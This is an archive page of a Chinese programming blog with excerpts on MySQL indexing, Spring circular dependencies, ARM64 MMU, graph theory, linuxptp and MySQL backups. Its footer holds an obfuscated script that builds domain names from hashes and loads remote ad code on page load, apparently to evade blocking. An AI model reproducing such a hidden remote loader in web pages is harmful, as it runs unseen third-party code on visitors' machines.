select　name from table where name like '李%' and age = 10 ans ismale = true; 因mysql 会一直向右匹配直到遇到范围查询（&gt;、&lt;、between、like）就停止匹配。范围列可以用到索引，但是范围列后面的列无法用到索引。即，索引最多用于一个范围列，因此如果查询条件中有两个范围列则无法全用到索引．
故此时根据　name like '李%' 可以利用索引，找到第一个name以李开头的记录(记作ID4)，避免全表查询．然后判断其他条件是否满足。
mysqlv5.6之前：
age字段不能利用索引，只能从 ID4 开始一个个回表。到主键索引上找出数据行，再对比字段(age和iamale)值.
mysqlv5.6之后：
age字段能利用索引， 可以在索引遍历过程中，对索引中包含的字段(age)先做判断，直接过滤掉不满足条件的记录，减少回表次数。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f75ba286689b311d5e489b91f0d4dfbb/" rel="bookmark">
			Spring 如何解决循环依赖的问题(三级缓存)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（一）Spring IOC容器---对象循环依赖
1. 什么是循环依赖？ what？
（1）循环依赖--&gt;循环引用。---&gt;即2个或以上bean 互相持有对方，最终形成闭环。
eg：A依赖B，B依赖C，C又依赖A。【注意：这里不是函数的循环调用【是个死循环，除非有终结条件】，是对象相互依赖关系】
2. Spring中循环依赖的场景？where？
①：构造器的循环依赖。【这个Spring解决不了】
StudentA有参构造是StudentB。StudentB的有参构造是StudentC，StudentC的有参构造是StudentA ，这样就产生了一个循环依赖的情况，
我们都把这三个Bean交给Spring管理，并用有参构造实例化
public class StudentA { private StudentB studentB ; public void setStudentB(StudentB studentB) { this.studentB = studentB; } public StudentA() { } public StudentA(StudentB studentB) { this.studentB = studentB; } } [java] view plain copy public class StudentB { private StudentC studentC ; public void setStudentC(StudentC studentC) { this.studentC = studentC; } public StudentB() { } public StudentB(StudentC studentC) { this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f75ba286689b311d5e489b91f0d4dfbb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e0a59de1755ff4306b18b7d089b3d11/" rel="bookmark">
			新冠疫情数据建模分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		4.2 湖北疫情数据预处理 import numpy as np import pandas as pd import matplotlib.pyplot as plt import seaborn as sns import matplotlib.dates as mdates #读入中国省份疫情数据，设置时间格式的索引 history_province = pd.read_csv('./alltime_province_work.csv', index_col=0,encoding="utf-8") history_province["日期"]=pd.to_datetime(history_province["日期"]) history_province.set_index("日期",inplace=True) history_province.index.name = None #从history_province中选取名称为湖北的数据，且选取的特征为累计确诊，累计治愈以及累计死亡 history_hubei = history_province.loc[history_province['名称']=='湖北',['累计确诊','累计治愈','累计死亡']] #可视化累计确诊人数 fig, ax = plt.subplots(figsize=(12, 6)) #选取湖北省数据中前90天的累计确诊数据进行绘图，不显示图例 sns.lineplot(data=history_hubei.iloc[:90,0],ax=ax,legend=False) ax.set_xlabel('日期',fontsize=15) ax.tick_params(labelsize=15) plt.gca().xaxis.set_major_formatter(mdates.DateFormatter('%Y-%m-%d')) plt.xticks(pd.date_range('2020-02-01','2020-04-18',freq='10d')) plt.gcf().autofmt_xdate() ylabels = [int(x) for x in ax.get_yticks()/10000] ax.set_yticklabels(ylabels) ax.set_ylabel('人数（万）',fontsize=15) ax.set_title('累计确诊人数', size=18) ax.patch.set_alpha(0) sns.despine() 4.3 Logistic增长模型 import numpy as np import matplotlib.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e0a59de1755ff4306b18b7d089b3d11/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4011fdd1a604df5dd46b9f1da9ce46e8/" rel="bookmark">
			ARM64 MMU 映射
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		MMU 架构示意 MMU 在 enable 之后， ARM core 对虚拟地址的访问流程
ARM Core 到 MMU 的 TLB 中查找是否有地址转换缓存，若有则返回给ARM Core;TLB 中没有转换缓存，则到Table walk 保存在 DDR/IRAM 的 translation table;在遍历 page table 过程中： Translation entry 不存在，则报一个 translation fault;若页表项存在，检查物理地址对应的page 是否在内存中，若在返回地址；若页表项对应物理地址不在内存中，此时产生 page fault, 需要从 disk 中将page 交换到内存ARM Core 根据返回地址访问地址时，会根据translation table 中指定的 attribute 来确定如何使用 cache 以及 访问权限检查最后访问具体地址 Translation table entry 格式 所谓translation table entry 也就是通常我们说的 page table 映射格式。它分为一级和二级。主要描述如下：
一级短描述符描述方式 对于 section, super section 映射方式，使用一级短描述符页表项即可，不需要二级描述符；
对于 page 则需要两级描述符进行描述；
各个类型映射如何区分？
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4011fdd1a604df5dd46b9f1da9ce46e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/321e745a96973a91768f2213ed708ecf/" rel="bookmark">
			扫雷_代码&#43;解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.完整代码
2.代码解析
2-1.第一部分：头文件
2-2.第二部分：变量的定义与声明
2-3.第三部分：函数的定义与声明
2-4.第四部分：主函数
2-5.第五部分：统计函数1-统计周围雷的个数
2-6.第六部分：统计函数2-统计周围被扫出雷的个数
2-7.第七部分：深搜函数-向四周扩展
2-8.第八部分：初始化函数
2-9.第九部分：移动光标函数
2-10.第十部分：颜色函数
2-11.第十一部分：输出函数1
2-12.第十二部分：输入函数
2-13.第十三部分：宽搜
2-14.输出函数2：
1.完整代码 扫雷游戏完整代码如下：
#include&lt;bits/stdc++.h&gt; #include&lt;windows.h&gt; #include&lt;conio.h&gt; using namespace std; int x,y,l,l2; bool s,c[11][11]; char a[11][11],b[11][11],f; int dx[]={0,-1,1,-1,1,0,-1,1}; int dy[]={-1,-1,-1,0,0,1,1,1}; int q[150][2],hh,tt,kx,ky; bool Map[11][11]; int statistics_1(int j,int i); int statistics_2(int j,int i); void around(int j,int i); void csh(); void color(int r); void gotoxy(int xx,int yy); void _cout(); void _cin(); void _move(); void _cout2(); int main(){ system("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/321e745a96973a91768f2213ed708ecf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2911f0d994cf99199f73b556baacb7a3/" rel="bookmark">
			离散数学 --- 特殊图 --- 欧拉图，哈密顿图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一部分 --- 欧拉图 1.在经过所有边的前提下，欧拉通路（回路）必定是最小的通路（回路），因为它经过每条边且只经过一次，没有比这更小的情况了。
2.回路一定是通路，但通路不一定是回路
1.入度比出度大1的结点是有向图中的欧拉通路的终点，入度比出度小1的结点则是始点
所谓的割边就是：
边A是连通图G中的一条边，如果连通图中删去这条边A后图不连通，则称边A为割边。
第二部分 --- 哈密顿图 1.将哈密顿提出的正十二面体投影到平面中，我们就可以得到右边那个图了
2.有了投影图之后，哈密顿提出的立方体问题也就转变为了平面点线问题了
1.只有具有 哈密顿回路 的图才能够称为哈密顿图
2.哈密顿通路（回路）和欧拉通路（回路）的区别：
哈密顿通路（回路）需要经过图中每个结点一次且仅一次（如果是回路的话允许从起点出发以及最终回到起点）欧拉通路（回路）需要经过图中每条边一次且仅一次
注意只有哈密顿图（具有哈密顿回路）才有上面的推论和下面的证明思路
1.证明思路：哈密顿图是原图的生成子图（点集相同，但是边集是子集），在生成子图中删去和原图中一样的结点时，由于子图的边集 ≤ 原图边集 ， 所以我们在子图中得到的连通分支数 ≥ 原图
所以我们只需要证明在哈密顿图（生成子图）中删除结点后得到的连通分支数 ≤ 删去的点数，就能够传递证明原图删除相同结点后得到的连通分支数 ≤ 删去的点数
1.只有哈密顿通路的时候也有一个必要条件，哈密顿回路的必要条件是哈密顿通路的必要条件的加强版
2.满足必要条件的图不一定是哈密顿图，但是不满足的一定不是，所以我们常常用这个必要条件来判断某些图不是哈密顿图 3.有割点的图一定不是哈密顿图，为什么呢？
割点的定义是：在原图中删去这个点后图中就会出现两个或两个以上的连通分支，根据定义我们可知，当删去割点时原图必不满足哈密顿图的充分条件，所以有割点的图一定不是哈密顿图
4.当我们根据定理去删原图中的结点的时候，我们应该删除那些结点呢？
答：我们应该删除那些图中具有最高度数的结点，这些高度数的结点对图的连通性影响大，删除它们的效果更明显。
1.简单图：既没有平行边也没有结点自己和自己连接的环状线
2.上面这个定理的证明较为冗长麻烦，咱这里就省掉了
3.哈密顿回路的充分条件则是哈密顿通路的加强版
1.充分条件：有A一定有B，A是B的充分条件
2.必要条件：无A一定无B，A是B的必要条件
3.充要条件：有A一定有B，无A一定无B，A是B的充分必要条件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a179406e38d9f730b69e471cfa4f8e39/" rel="bookmark">
			Linuxptp安装部署
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ptp介绍 PTP（Precision Time Protocol）精确时间协议，由IEEE1588规定，用于同步网络中多台设备。
ptp工作原理 PTP时钟可以实现主时钟和从时钟功能，但是一个PTP通信子网内只能有一个主时钟。在系统的同步过程中，PTP主时钟提供时间同步及时间信息，从时钟接收主时钟发来的时间戳信息，系统根据此信息计算出主从线路时间延迟及主从时间差，并利用该时间差调整本地时间，从而使设备时间保持与主设备时间一致的频率和相位,实现频率同步和时间同步。
ptp中的设备类型 PTP作用的对象是时钟，主要分为全局主时钟（GrandMaster），主时钟（MasterClock），透明时钟（TransparentClock），边界时钟（BoundaryClock）和普通时钟（OrdinaryClock）。
全局主时钟（GM）全局唯一，为PTP域中的所有设备提供时间基准。主时钟（MC）OC和BC的基准时钟称为主时钟。边界时钟 (BC)有多个端口连接到网络的时钟，一个slave端口连接到上游设备的PTP端口，其他的端口作为master连接到下游设备的slave端口。下游slave端口同构PTP协议直接同步于边界时钟，而不是直接和grandmaster通信。普通时钟（OC）只有一个端口（port）连接到网络的时钟，可以作为master或slave之一； 作为master时候，可以是 grandmaster，作为slave时候，一般作为时钟分发网络的端点设备（end，最后一级）。 透明时钟（TC）可以担负同步系统中信号分配器的角色。它拥有多个PTP端口，不需要像普通时钟和边界时钟一样与其他节点进行时间同步，仅负责在端口之间转发PTP报文时，对其进行转发延时校正（在PTP报文中增加时间校正信息）。 linuxptp介绍 在服务器上安装部署linuxptp就不做过多说明了，联网安装可执行下面的指令
yum install -y linuxptp Linuxptp主要包含两个软件，一个是ptp4l，一个是phc2sys。作用分别如下
ptp4l：遵循IEEE 1588-2008标准文档规范，实现了BC（Boundary Clock）、OC（Ordinary Clock）和TC（Transparent Clock）；phc2sys：phc2sys是一个同步系统中两个或多个时钟的程序。通常，它用于将系统时钟与PTP硬件时钟（PHC）同步，该硬件时钟本身由ptp4l（8）程序同步；pcm：在ptp4l运行期间对其进行配置。 ptp4l指令详解 [root@localhost ~]# ptp4l -h usage: ptp4l [options] Delay Mechanism -A Auto, starting with E2E -E E2E, delay request-response (default) -P P2P, peer delay mechanism Network Transport -2 IEEE 802.3 -4 UDP IPV4 (default) -6 UDP IPV6 Time Stamping -H HARDWARE (default) -S SOFTWARE -L LEGACY HW Other Options -f [file] read configuration from 'file' -i [dev] interface device to use, for example 'eth0' (may be specified multiple times) -p [dev] PTP hardware clock device to use, default auto (ignored for SOFTWARE/LEGACY HW time stamping) -s slave only mode (overrides configuration file) -t transparent clock -l [num] set the logging level to 'num' -m print messages to stdout -q do not print messages to the syslog -v prints the software version and exits -h prints this message and exits phc2sys指令详解 [root@localhost ~]# phc2sys autoconfiguration or valid source clock must be selected.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a179406e38d9f730b69e471cfa4f8e39/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db5fdb93a85a87517b3302e2dc2f4dec/" rel="bookmark">
			mysql数据备份与导入（二）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		6.逻辑导出导入 1.数据逻辑导出：
注意点：需要指定导出的文件，在my.cnf中新增secure_file_priv=导出到的文件，且此文件所在目录需要mysql用户的rwx权限
select 需要导出的字段 into outfile '导出到的文件' from 表名; 2.数据逻辑导入：
方法1：需要登录到mysql中
load data local infile '需导入文件全路径' into table 需导入的表名; 方法2：要求导入的文件名必须和数据表名称完全一致
mysqlimport 表所在库名 需导入文件全路径 7.物理备份 1.xtrabackup备份介绍 优点：1.备份速度快、可靠2.支持增量备份3.备份过程不会打断正在执行的事务4基于压缩等功能节约磁盘空间和流量5.自动实现备份检验6.还原速度快
缺点：1.只能innodb增量备份myisam只支持全量备份2.innobackupex备份myisam表之前要对全库加READ LOCK，阻塞写操作，若备份从库会影响主从同步，对innodb表备份不会阻塞读写
2.xtrabackup备份原理 redo log日志？
3.获取xtrabackup备份工具 4.xtrabackup全库备份及恢复 核心思路：1.首先对数据库进行全量备份，备份完成后不能立即恢复（数据不完整，缺少备份过程中的数据）2.预备阶段，备份过程中产生的xtrabackup_log数据应用到全量备份集。
1.数据准备以及账号创建：
1.创建数据库创表（innodb与myisam） create database db3 default charset=utf8; create table user1(id int,name varchar(20)) engine=innodb default charset=utf8; create table user2(id int,name varchar(20)) engine=myisam default charset=utf8; insert into user1 values (3,'张三'); insert into user2 values (5,'李四'); 2.专门创建一个mysql备份账号，开通相应权限 grant reload,process,lock tables,replication client on *.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db5fdb93a85a87517b3302e2dc2f4dec/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/233/">«</a>
	<span class="pagination__item pagination__item--current">234/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/235/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>